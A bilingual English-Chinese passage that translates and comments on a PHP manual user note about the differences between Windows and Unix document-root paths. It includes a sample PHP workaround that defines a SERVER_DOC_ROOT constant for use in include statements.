However, Unix file/folder structuring is a little different. The / represents the root of the hard drive or current hard drive partition. In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs). Thusly, an error/warning would be thrown because the path doesn't exist in the root path.  
  然而,在Unix的文件目录结构下有点不同. 正斜杠表示硬盘或当前盘符的根目录.换言之,它基本上会去寻找root:/Path/To/File.php而不是serverRoot:/Path/To/File.php(通常就是 /usr/var/www/htdocs,htdocs很多时候是默认的web服务器根目录).这样,一个错误/警告会被抛出,因为指定的路径在根目录不存在.
  
I just thought I'd mention that. It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.  
我想我提到的这些,肯定存在一些问题,对于在Windows上开发,然后会转移程序到Unix类服务器上运行的用户
  
A work around would be something like:  一个绕过这个问题的方法,像下面这样

    <?php  
    $documentRoot = null;  
    //在web模式有DOCUMENT_ROOT,命令行模式没有,以此区分当前是在什么环境下执行脚本  
    if (isset($_SERVER['DOCUMENT_ROOT'])) {  
	    $documentRoot = $_SERVER['DOCUMENT_ROOT'];  
	      
	    if (strstr($documentRoot, '/') || strstr($documentRoot, '\\')) {  
		    if (strstr($documentRoot, '/')) {  //一个正斜杠表示运行在linux上
			    $documentRoot = str_replace('/', DIRECTORY_SEPARATOR, $documentRoot);  
		    }  elseif (strstr($documentRoot, '\\')) { 
		    //两个反斜杠,表示运行在Windows上,因为反斜杠是转义符,两个反斜杠转义后表示一个反斜杠 
			    $documentRoot = str_replace('\\', DIRECTORY_SEPARATOR, $documentRoot);  
		    }  
	    }  
	      
	    if (preg_match('/[^\\/]{1}\\[^\\/]{1}/', $documentRoot)) {  
		    $documentRoot = preg_replace('/([^\\/]{1})\\([^\\/]{1})/', '\\1DIR_SEP\\2', $documentRoot);  
		    $documentRoot = str_replace('DIR_SEP', '\\\\', $documentRoot);  
		}  
    }  
    else {  
	    /**  
	    * I usually store this file in the Includes folder at the root of my  
	    * virtual host. This can be changed to wherever you store this file.  
	    *  
	    * Example:  
	    * If you store this file in the Application/Settings/DocRoot folder at the  
	    * base of your site, you would change this array to include each of those  
	    * folders.  
	    *  
	    * <code>  
	    * $directories = array(  
	    * 'Application',  
	    * 'Settings',  
	    * 'DocRoot'  
	    * );  
	    * </code>  
	    */  
	    $directories = array(  
	    'Includes'  
	    );  
	      
	    if (defined('__DIR__')) {  
	    $currentDirectory = __DIR__;  
	    }  
	    else {  
	    $currentDirectory = dirname(__FILE__);  
	    }  
	      
	    $currentDirectory = rtrim($currentDirectory, DIRECTORY_SEPARATOR);  
	    $currentDirectory = $currentDirectory . DIRECTORY_SEPARATOR;  
	      
	    foreach ($directories as $directory) {  
	    $currentDirectory = str_replace(  
	    DIRECTORY_SEPARATOR . $directory . DIRECTORY_SEPARATOR,  
	    DIRECTORY_SEPARATOR,  
	    $currentDirectory  
	    );  
	    }  
	      
	    $currentDirectory = rtrim($currentDirectory, DIRECTORY_SEPARATOR);  
    }  
      
    define('SERVER_DOC_ROOT', $documentRoot);  
    ?>  

  
Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.  
使用这个文件,你可以包含文件时使用定义好的SERVER_DOC_ROOT常量,然后每个文件都从正确的位置被包含进来,而没有错误/警报被抛出
  
Example:  
使用实例:
    <?php  
	    include SERVER_DOC_ROOT . '/Path/To/File.php';  
    ?>

这个例子我没有完全理解作者的用意,大概意思就是规避windows和linux平台的差异问题.但由于这个比较已经十几年前的了.相关的问题是否还存在没有去彻底研究清楚.但这个作者方法不太可取,只能适用于他自己的项目.对于其他人基本无法使用.

当前的框架对于这个两种OS平台的目录分隔符的差异的解决办法都是在代码中直接使用 `'/'` 来表示,不使用`'\'`或`'\\'` ,因为在所有平台php都能识别出 path/to/file.php 的目录结构.

而这个用户提到的windows 和linux对于web服务器根目录的差异,这个本身应该是程序员在写代码时就应该做好的限制,不允许直接使用任何 正斜杠 或者 反斜杠 开头的路径,因为这样会令php认为你是在引入磁盘根目录的文件.
比如 :`include '/exrun.php'; //在windows和linux都会去到磁盘的根目录寻找文件`
而: `include  '\\exrun.php'; // 使用两个反斜杠\\,在windows上会去磁盘根目录寻找文件, 但在linux上会报错,Warning: include(\exrun.php): failed to open stream: No such file or directory`
因为两个反斜杠转义后变成一个反斜杠,这在windows上就是指磁盘根目录,而在linux上不存在'\'开头的路径.

### 官方文档后面还有很多负数评分的笔记,对于这些笔记都是经过其他用户评价过的无用或过时笔记,就不再翻译研究了.

